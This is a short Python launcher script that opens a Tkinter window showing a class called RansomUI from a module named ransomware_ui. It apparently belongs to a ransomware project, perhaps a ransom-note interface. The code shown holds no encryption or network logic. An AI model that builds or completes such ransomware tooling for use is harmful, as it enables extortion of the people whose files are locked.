import tkinter as tk
import os
from ui import ransomware_ui

if __name__ == "__main__":
    new_root_folder = "./ui"
    os.chdir(new_root_folder)

    root = tk.Tk()
    app = ransomware_ui.RansomUI(root)
    root.mainloop()